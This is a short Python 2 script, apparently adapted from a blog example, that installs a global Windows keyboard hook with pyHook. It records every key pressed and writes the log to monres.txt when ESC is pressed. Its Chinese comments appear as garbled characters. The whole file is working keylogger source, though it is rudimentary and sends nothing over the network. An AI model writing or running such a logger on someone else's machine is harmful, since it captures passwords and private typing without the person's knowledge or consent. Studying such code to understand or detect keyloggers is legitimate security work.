# -*- coding: utf-8 -*- #
# modified from origin by oldj http://oldj.net/ #
'''
��Ҫpyhook
for x86_64  
http://www.lfd.uci.edu/~gohlke/pythonlibs/#pyhook����pyHook-1.5.1-cp27-none-win_amd64.whl64λ�����py2.7�汾���еİ���
��ѹ���pyhook�ļ��зŽ�C:\Python27\Lib\site-packages\pyHook
for x86
http://sourceforge.net/projects/pyhook/files/pyhook/1.5.1/  ��װ�ܼ�
�ű�����ʱ����һ��cmd������޺ۼ����������ͬĿ¼������monres.txt�ļ�
��ESC�˳�����
ref:
http://www.cnblogs.com/6tian/p/5689142.html
https://blog.oldj.net/2010/07/14/python-hook/
'''
import pythoncom
import pyHook
import sys
flag = 0
res = ''


def onKeyboardEvent(event):
    global res
    key = event.Key
    if key == 'Escape':
        with open('monres.txt', 'w+') as f:
            f.write(res)
        sys.exit(0)
    res += key
    return True


def main():
    print """
    DON'T BE EVIL 
        made by findneo 
            2017/8/17 12:46
            
    �밴ESC���˳� :D 
    """
    # ����һ�������ӡ��������
    hm = pyHook.HookManager()
    # �������м����¼�
    hm.KeyDown = onKeyboardEvent
    # ���ü��̡����ӡ�
    hm.HookKeyboard()
    # ����ѭ�����粻�ֶ��رգ�����һֱ���ڼ���״̬
    pythoncom.PumpMessages()

if __name__ == "__main__":
    main()
